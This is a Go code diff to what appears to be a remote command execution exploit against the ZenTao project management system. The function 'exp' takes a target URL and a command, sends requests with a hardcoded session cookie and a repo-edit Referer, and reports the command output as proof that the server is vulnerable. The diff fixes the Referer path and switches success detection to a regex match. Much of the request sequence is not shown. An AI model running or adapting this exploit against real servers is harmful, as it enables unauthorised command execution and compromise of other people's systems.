@@ -13,11 +13,12 @@ import (
 	"fmt"
 	"github.com/PuerkitoBio/goquery"
 	"net/http"
+	"regexp"
 )
 
 func exp(url string, execute string) string {
 	Header1 := map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default"}
-	Header2 := map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Referer": url + "/repo-edit-1-0.html"}
+	Header2 := map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Referer": url + "repo-edit-1-0.html"}
 	// 建立会话
 	client := http.Client{}
 	// 请求第一步
@@ -53,7 +54,8 @@ func exp(url string, execute string) string {
 	defer rep3.Body.Close()
 	// 获取命令执行结果
 	result, _ := goquery.NewDocumentFromReader(rep3.Body)
-	if result.Text()[2:8] == "result" {
+	reg, _ := regexp.MatchString(".sh:", result.Text())
+	if reg {
 		return "存在漏洞,执行结果如下：\n" + result.Text()
 	} else {
 		return "未发现漏洞"
